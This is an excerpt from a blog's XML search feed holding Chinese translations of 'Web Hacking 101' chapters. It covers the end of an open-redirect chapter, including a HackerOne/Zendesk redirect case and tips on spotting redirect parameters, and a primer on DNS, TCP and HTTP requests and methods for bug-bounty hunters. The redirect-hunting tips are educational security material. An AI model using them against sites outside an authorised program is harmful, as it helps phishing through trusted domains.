class="line-numbers-rows"><span></span><span></span></span></code></pre><p>由于该链接包含域hackerone.com，因此插页式网页不会显示，并且用户不会知道所访问的网页是不安全的。有趣的是，Jamal最初将缺失的插页式页面重定向问题报告给了Zendesk，但它被忽略且未标记为漏洞。他不断挖掘以寻找如何利用缺失的插页式广告。最终，他发现了JavaScript重定向攻击，使HackerOne付了赏金。</p><p><strong>重点</strong></p><p>搜索漏洞时，请注意站点使用的服务，因为每个服务都代表新的攻击媒介。通过结合HackerOne对Zendesk的使用和已知的HackerOne允许的重定向，可以使此HackerOne漏洞成为可能。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>开放重定向允许恶意攻击者在不知不觉中将用户重定向到恶意网站。从示例漏洞报告中了解到，找到它们通常需要敏锐的观察。如示例中所述，当重定向参数具有诸如<code>redirect_to =，domain_name =</code>或<code>checkout_url =</code>之类的名称时，有时很容易发现。其他时候，它们的名称可能不太明显，例如<code>r =，u =</code>等。</p><p>开放重定向漏洞依赖于滥用信任，即诱使目标用户以为攻击者正在访问他们认识的网站，同时诱使他们访问攻击者的网站。当发现可能的易受攻击的参数时，如果URL的某些部分经过硬编码，请确保对其进行彻底测试并添加特殊字符。</p><p>HackerOne插页式重定向显示了在寻找漏洞时识别网站使用的工具和服务的重要性。请记住，有时您需要保持执着，并清楚地表明一个说服公司接受您的发现并支付赏金的漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
            <tag> 开放重定向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Part1 漏洞挖掘基础知识</title>
      <link href="part1-lou-dong-wa-jue-ji-chu-zhi-shi/"/>
      <url>part1-lou-dong-wa-jue-ji-chu-zhi-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="Part1-漏洞挖掘基础知识"><a href="#Part1-漏洞挖掘基础知识" class="headerlink" title="Part1 漏洞挖掘基础知识"></a><center>Part1 漏洞挖掘基础知识</center></h1><p><font color="#A52A2A" size="4"><em>本文部分翻译自《Web Hacking 101》，仅供参考学习，切勿二传。</em></font></p><p>如果您是黑客新手，这篇文章可以让您对互联网的工作原理有一个基本了解，你会了解到当在浏览器的地址栏中输入URL时，幕后到底发生了什么。尽管导航到网站似乎很简单，但是它涉及许多隐藏的过程，例如准备HTTP请求，将请求发送目的地的域名，将域名转换为IP地址，发送请求，呈现响应等等。 </p><p>在本章中，您将学习基本概念和术语，例如漏洞，漏洞赏金，客户端，服务器，IP地址和HTTP。您将大致了解如何执行意外操作以及提供意外输入或对私人信息的访问会导致漏洞。然后，我们将看到在浏览器的地址栏中输入URL时会发生的情况，包括HTTP请求和响应以及各种HTTP操作。我们将在本章结束时了解HTTP是无状态的含义。</p><h2 id="漏洞和漏洞赏金"><a href="#漏洞和漏洞赏金" class="headerlink" title="漏洞和漏洞赏金"></a>漏洞和漏洞赏金</h2><p>漏洞是应用程序中的一个弱点，它使恶意程序可以执行某些未经许可的操作或访问他们不应该被允许访问的信息。</p><p>在学习和测试应用程序时，请记住，攻击者执行有意和无意的操作可能会导致漏洞。例如，更改记录标识符的ID以访问您不应该访问的信息就是一个无意操作的示例。</p><p>假设一个网站需要您使用您的姓名，电子邮件，生日和地址来创建个人资料。您的信息是保密的，且仅与您的朋友共享。但是，如果网站允许任何人未经您的允许将您加为好友，这将是一个漏洞。即使该网站使您的信息对非朋友而言都是私密的，但通过允许任何人将您添加为朋友，任何人都可以访问您的信息。在测试站点时，请始终考虑到会有人如何滥用现有功能。 </p><p>漏洞赏金是网站或公司对任何发现漏洞并将其报告给该网站或公司的人的奖励。奖励通常是金钱，范围从数万美元到数万美元不等。赏金的其他内容包括加密货币，航空里程，奖励积分，服务积分等。</p><p>当公司提供赏金悬赏时，它会创建一个“程序”，我们将在本书中使用该术语来表示公司为希望测试公司漏洞的人员所建立的规则和框架。请注意，这不同于运行漏洞披露程序（VDP）的公司。漏洞赏金会提供一些金钱奖励，而VDP则不提供付款。 VDP只是道德黑客向公司报告漏洞以使公司修复漏洞的一种方式。尽管本书中描述的报告中并非所有都得到了回报，但它们都是来自于参与漏洞赏金计划的黑客。</p><h2 id="客户端和服务器"><a href="#客户端和服务器" class="headerlink" title="客户端和服务器"></a>客户端和服务器</h2><p>您的浏览器依赖于Internet，Internet是相互发送消息的计算机网络。我们称这些消息为数据包。数据包包括您要发送的数据以及有关该数据的来源和去向的信息。互联网上的每台计算机都有一个向其发送数据包的地址。但是某些计算机只接受某些类型的数据包，而其他计算机仅允许其他计算机的受限列表中的数据包。然后由接收计算机决定如何处理数据包以及如何响应。就本书而言，我们将仅关注数据包（HTTP消息）中包含的数据，而不是数据包本身。</p><p>我将这些计算机称为客户端或服务器。无论请求是否由浏览器，命令行等发起，发起请求的通常都称为客户端。服务器是指接收请求的网站和Web应用程序。如果该概念适用于客户端或服务器，那么我一般指的是计算机。</p><p>因为Internet可以包括任意数量的相互通信的计算机，所以就需要有关计算机应如何通过Internet进行通信的特定准则。它使用了“<strong>Request for Comment</strong>（RFC）”文档的形式，该文档定义了计算机应如何运行的标准。例如，超文本传输协议（HTTP）定义Internet浏览器如何使用Internet协议（IP）与远程服务器通信。在这种情况下，客户端和服务器都必须同意实施相同的标准，以便他们可以理解各自正在发送和接收的数据包。</p><h2 id="您访问网站时会发生什么"><a href="#您访问网站时会发生什么" class="headerlink" title="您访问网站时会发生什么"></a>您访问网站时会发生什么</h2><p> 因为我们将在本书中重点介绍HTTP消息，所以本节为您提供了在浏览器的地址栏中输入URL时发生的过程的高度概述。</p><p><strong><em>步骤1：提取域名</em></strong></p><p>输入<code>http://www.google.com/</code>后，您的浏览器将从URL确定域名。域名用于标识您要访问的网站，并且必须遵守RFC定义的特定规则。例如，域名只能包含字母数字字符和下划线。国际化域名是一个例外，超出了本书的范围。要了解更多信息，请参阅RFC 3490，其中定义了它们的用法。在这种情况下，域名为<code>www.google.com</code>。域名是查找服务器地址的一种方法。</p><p><strong><em>步骤2：解析IP地址</em></strong></p><p>确定域名后，浏览器将使用IP查找与该域关联的IP地址。 此过程称为解析IP地址，并且Internet上的每个域都必须解析为IP地址才能正常工作。</p><p>存在两种类型的IP地址：Internet协议版本4（IPv4）和Internet协议版本6（IPv6）。 IPv4地址被构造为四个由句点连接的数字，每个数字的范围为0到255。IPv6是Internet协议的最新版本。 它旨在解决可用IPv4地址用尽的问题。 IPv6地址由冒号分隔的八组四个十六进制数字组成，但是存在一些缩短IPv6地址的方法。 例如，8.8.8.8是IPv4地址，而2001：4860：4860 :: 8888是缩短的IPv6地址。</p><p>要仅使用域名查找IP地址，您的计算机会向域名系统（DNS）服务器发送请求，该服务器由Internet上的专用服务器组成，这些服务器具有所有域及其匹配IP地址的注册表。前面的IPv4和IPv6地址是Google DNS服务器。</p><p>在此示例中，您连接的DNS服务器会将<code>www.google.com</code>与IPv4地址216.58.201.228匹配，然后将其发送回您的计算机。要了解有关网站IP地址的更多信息，可以从终端使用命令dig命令（linux）。</p><p><strong><em>步骤3：建立TCP连接</em></strong></p><p>接下来，由于您使用http：//访问站点，因此计算机尝试使用IP地址在端口80上建立传输控制协议（TCP）连接。 TCP的详细信息并不重要，除了要注意它是定义计算机相互通信方式的另一种协议。 TCP提供双向通信，因此消息接收者可以验证接收到的信息，并且传输过程中不会丢失任何信息。</p><p>您向其发送请求的服务器可能正在运行多个服务（将服务视为计算机程序），因此它使用端口来标识接收请求的特定进程。您可以将端口视为服务器通往互联网的大门。没有端口，服务将不得不竞争发送到同一位置的信息。这意味着我们需要另一个标准来定义服务之间的协作方式，并确保一项服务的数据不会被另一项窃取。例如，端口80是用于发送和接收未加密的HTTP请求的标准端口。另一个公共端口是443，用于加密的HTTPS请求。尽管端口80是HTTP的标准端口，而端口443是HTTPS的标准端口，但根据管理员配置应用程序的方式，TCP通信可以在任何端口上进行。</p><p>您可以通过打开终端并运行<code>nc &lt;IP ADDRESS&gt; 80</code>，在端口80上建立到网站的TCP连接。它使用Netcat实用程序的nc命令创建用于读取和写入消息的网络连接。</p><p><strong><em>步骤4：发送HTTP请求</em></strong></p><p>以<code>http://www.google.com/</code>为例，如果步骤3中的连接成功，则浏览器应准备并发送HTTP请求，如清单1-1所示：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">➊ GET / HTTP/1.1 ➋ Host: www.google.com ➌ Connection: keep-alive ➍ Accept: application/html, */* ➎ User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36   (KHTML, like Gecko) Chrome/72.0.3626.109 Safari/537.36  （KHTML，例如Gecko）Chrome / 72.0.3626.109 Safari / 537.36 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>代码list 1-1：发送一个HTTP请求</em></p><p>浏览器向/路径➊（该网站的根目录）发出GET请求。网站的内容是通过路径组织的，就像计算机上的文件夹和文件一样。当你想访问文件夹的下一级，您可以在文件夹的名称后跟一个/即可表示该文件的路径。当您访问网站的第一页时，您将访问根路径，即/。浏览器还表示它正在使用HTTP 1.1版协议。 GET请求仅检索信息。我们稍后将详细了解它。</p><p>Host头➋保存着额外的信息，它作为请求的一部分被发送。 HTTP 1.1需要它来识别给定IP地址的服务器应将请求发送到哪里，因为IP地址可以托管多个域名。Connection header➌表示保持与服务器的连接保持打开状态的请求，以避免不断打开和关闭连接的开销。</p><p>您可以在➍看到预期的响应格式。在这个例子，我们期望得到application / html格式。但正如通配符（* / *）所示，我们可以接受任何格式。内容类型虽然有数百种，但在这本书里，您会经常看到的是application / html，application / json，application / octet-stream和text / plain。最后，用户代理➎表示负责发送请求的软件。</p><p><strong><em>步骤5：服务器响应</em></strong></p><p>为了响应我们的请求，服务器会使用类似List 1-2进行响应：</p><pre class="line-numbers language-html" data-language="html"><code class="language-html">➊ HTTP/1.1 200 OK ➋ Content-Type: text/html   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>    ​<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>     ​<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Google.com<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  ​ ➌ --**snip**--    ​<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>   ​<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><em>List 1-2：服务器响应</em></p><p>在这里，我们收到了HTTP响应，其状态码为200➊，并已附加到HTTP / 1.1。状态码很重要，因为它指示服务器如何响应。这些代码也由RFC定义，通常具有以2、3、4或5开头的三位数字。尽管没有严格要求服务器使用特定代码，但是2xx代码通常表示请求成功。</p><p>因为没有严格执行服务器如何实现其HTTP代码使用的强制措施，所以即使HTTP消息正文说明存在应用程序错误，您也可能会看到某些应用程序以200响应。 HTTP消息主体是与请求或响应关联的内容。在这种情况下，由于Google的响应主体很大，因此我们删除了内容，并以–snip-替换。网页的响应内容通常是HTML，但对于应用程序编程接口的响应，则可以是JSON，对于文件下载，则可以是文件内容，等等。</p><p>Content-Type头➋告知浏览器主体的媒体类型。媒体类型确定浏览器如何呈现正文内容。但是浏览器并不总是使用应用程序返回的值。取而代之的是，浏览器执行MIME嗅探，读取正文内容的第一位以确定自己的媒体类型。应用程序可以通过包含X-Content-Type-Options：nosniff来禁用此浏览器行为，该标头未包含在前面的示例中。</p><p>其他以3开头的响应代码表示重定向，该重定向指示您的浏览器提出额外的请求。例如，如果Google从理论上讲需要将您从一个URL永久重定向到另一个URL，则可以使用301响应。而302是临时重定向。</p><p>收到3xx响应时，浏览器应向Location标头中定义的URL发出新的HTTP请求，如下所示：</p><p><code>HTTP/1.1 301 Found Location: https://www.google.com/</code></p><p>以4开头的响应通常表示用户错误，例如，尽管请求提供了有效的HTTP请求，但请求中并未包含用于授权访问内容的适当标识，则响应403。以5开头的响应标识某种类型的服务器错误，例如503，指示服务器无法处理发送的请求。</p><p><strong><em>步骤6：呈现响应</em></strong></p><p>由于服务器发送的响应内容的类型为text / html，状态码为200，因此我们的浏览器将开始呈现收到的内容。响应的主体告诉浏览器应向用户显示的内容。</p><p>对于我们的示例，这将包括用于页面结构的HTML；级联样式表（CSS），用于样式和布局；和JavaScript以添加其他动态功能和媒体，例如图像或视频。服务器有可能返回其他内容，例如XML。第11章将更详细地讨论XML。</p><p>由于网页可以引用外部文件（例如CSS，JavaScript和媒体），因此浏览器可能会针对网页的所有必需文件提出其他HTTP请求。当浏览器请求这些其他文件时，它将继续解析响应并将主体显示为网页。在这个例子，它将呈现Google的主页<code>www.google.com</code>。</p><p>请注意，JavaScript是每种主流浏览器都支持的脚本语言。 JavaScript使网页具有动态功能，包括能够在不重新加载网页的情况下更新网页上的内容，检查密码（在某些网站上）是否足够牢固等。与其他编程语言一样，JavaScript具有内置函数，可以将值存储在变量中，并响应网页上的事件运行代码。它还可以访问各种浏览器应用程序编程接口（API）。这些API使JavaScript能够与其他系统进行交互，其中最重要的可能是文档对象模型（DOM）。</p><p>DOM使JavaScript可以访问和操纵网页的HTML和CSS。这很重要，因为如果攻击者可以在网站上执行自己的JavaScript，他们将有权访问DOM并可以代表目标用户在网站上执行操作。第7章将进一步探讨该概念。</p><h2 id="HTTP请求"><a href="#HTTP请求" class="headerlink" title="HTTP请求"></a>HTTP请求</h2><p>客户端和服务器之间关于如何处理HTTP消息的协议包括定义请求方法。请求方法指示客户端请求的目的以及客户端期望成功的结果。例如，List 1-1中，我们向<code>http://www.google.com/</code>发送了一个GET请求，这意味着我们期望仅返回<code>http://www.google.com/</code>的内容，而不会执行其他任何操作。由于Internet被设计为远程计算机之间的接口，因此开发并实现了请求方法以区分所调用的动作。</p><p>HTTP标准定义了以下请求方法：GET，HEAD，POST，PUT，DELETE，TRACE，CONNECT和OPTIONS（PATCH也被提出了，但在HTTP RFC中未实现）。在撰写本文时，浏览器仅使用HTML发送GET和POST请求。任何PUT，PATCH或DELETE请求都是JavaScript调用HTTP请求的结果。下一节简要概述了您在本书中可以找到的请求方法。</p><h3 id="请求方法"><a href="#请求方法" class="headerlink" title="请求方法"></a>请求方法</h3><p>GET方法可以查找由请求统一资源标识符（URI）标识的任何信息。术语URI通常与统一资源定位符（URL）同义使用。从技术上讲，URL是URI的一种，它定义了一种资源，并包括一种通过其网络位置来定位该资源的方法。例如，<code>http://www.google.com/&lt;example&gt;/file.txt</code>和<code>/&lt;example&gt;/file.txt</code>是有效的URI。但是只有<code>http://www.google.com/&lt;example&gt;/file.txt</code>是有效的URL，因为它标识了如何通过域名<code>http://www.google.com</code>查找资源。尽管有细微差别，但在引用任何资源标识符时，我们都会在整本书中使用URL。</p><p>虽然无法强制执行此要求，但GET请求不应更改数据；他们应该只是从服务器检索数据并在HTTP消息主体中返回数据。例如，在社交媒体网站上，GET请求应返回您的个人资料名称，但不更新您的个人资料。对于第4章中讨论的跨站点请求伪造（CSRF）漏洞，GET至关重要。访问任何URL或网站链接（除非由JavaScript调用）都会导致您的浏览器将GET请求发送到目标服务器。此行为对于第2章中讨论的开放重定向漏洞至关重要。</p><p>HEAD方法与GET方法相同，除了前者服务器在响应中不会返回消息主体。</p><p>POST方法在接收服务器上调用由服务器确定的某些功能。换</p><p>句话说，通常将执行某种类型的后端操作，例如创建评论，注册用户，删除帐户等等。服务器为响应POST而执行的操作可能有所不同。有时，服务器可能根本不采取任何措施。例如，POST请求可能会导致在处理请求时发生错误，并且记录不会保存在服务器上。</p><p>PUT方法调用某些函数，该函数引用远程网站或应用程序上已经存在的记录。例如，当更新已经存在的帐户，博客帖子等时，可以使用它。同样，执行的操作可能会有所不同，并且可能导致服务器完全不执行任何操作。</p><p>DELETE方法请求远程服务器删除用URI标识的远程资源。</p><p>TRACE方法是另一种不常用的方法。它用于将请求消息反射回请求者。它允许请求者查看服务器正在接收的内容，并将该信息用于测试和收集诊断信息。</p><p>CONNECT方法保留给代理使用，代理是将请求转发到其他服务器的服务器。此方法使用请求的资源启动双向通信。例如，CONNECT方法可以通过代理访问使用HTTPS的网站。</p><p>OPTIONS方法从服务器请求有关可用通信选项的信息。例如，通过调用OPTIONS，可以查明服务器是否接受GET，POST，PUT，DELETE和OPTIONS调用。此方法不会指示服务器是否接受HEAD或TRACE调用。浏览器会针对特定内容类型（例如application / json）自动发送此类请求。这种方法称为preflight OPTIONS调用，将在第4章中进行更深入的讨论，因为它用作CSRF漏洞保护。</p><h3 id="HTTP是无状态的"><a href="#HTTP是无状态的" class="headerlink" title="HTTP是无状态的"></a>HTTP是无状态的</h3><p>HTTP请求是无状态的，这意味着发送到服务器的每个请求都被视为全新请求。收到请求时，服务器对其先前与浏览器的通信一无所知。这对于大多数站点都是有问题的，因为这些站点想记住您是谁。否则，您必须为每个发送的HTTP请求重新输入用户名和密码。这也意味着，必须将客户端发送给服务器的每个请求中的所有数据重新加载，以处理HTTP请求。为避免每次HTTP请求都必须重新发送用户名和密码，网站使用Cookie或基本身份验证。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>您现在应该对互联网的工作原理有基本的了解。 具体来说，您学习了在浏览器的地址栏中输入网站时发生的情况：浏览器如何将其转换为域，域如何映射到IP地址以及HTTP请求如何发送到服务器。</p><p>您还学习了浏览器如何构造请求和呈现响应以及HTTP请求方法如何允许客户端与服务器进行通信。 此外，您还了解到，漏洞是由某人执行意外操作或获得对原本不可用的信息的访问所导致的，而漏洞赏金是从道德上发现漏洞并向网站所有者报告漏洞的奖励。</p>]]></content>
      
      
      <categories>
          
          <category> WebHacking101 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞挖掘 </tag>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
